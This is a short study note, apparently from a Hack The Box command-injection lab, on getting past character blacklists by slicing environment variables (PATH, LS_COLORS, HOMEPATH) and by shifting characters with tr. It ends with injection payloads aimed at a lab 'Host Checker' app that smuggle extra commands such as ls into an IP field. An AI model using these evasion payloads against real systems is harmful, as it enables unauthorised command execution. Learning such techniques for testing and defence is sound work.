---
title: c-Bypass Other Blacklisted Characters
draft: false
tags:
---
`/` and `\` is also blacklisted very often.

However these are needed to specify directories in Linux or Windows.

## Linux

We can use **Linux Environment Variables** and specify the `start` and `length` of our string to exactly match the character we want.

For example, `{$PATH}` usually looks like something below:

```shell-session
jadu101@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

We can use this to specify a character like `/` as such:

```shell-session
jadu101@htb[/htb]$ echo ${PATH:0:1}

/
```

We can use the above technique to get a semi-colon character as well:

```shell-session
jadu101@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

Assuming we are pentesting web app from earlier articles (Host Checker), we can inject payload as such:

```
127.0.0.1${LS_COLORS:10:1}${IFS}
```


## Windows

To produce a slash in Windows Command Line, we can echo a Windows variable such as `%HOMEPATH%` and then specify a starting position, and finally specify a negative end position to get a slash.

- `%HOMEPATH%` - \Users\htb-student
- `~6` - `\htb-student`
- `-11` - `\`

So we the command below, I can get a slash:

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

We can achieve the same variables in `Windows PowerShell` as such:

```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```

We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need. `Try to be creative and find different commands to produce similar characters.`

## Character Shifting

For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```shell-session
jadu101@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
jadu101@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```


I used the command below to send `ls` command to `/home`:

`127.0.0.1%0a{ls,${PATH:0:1}home}`

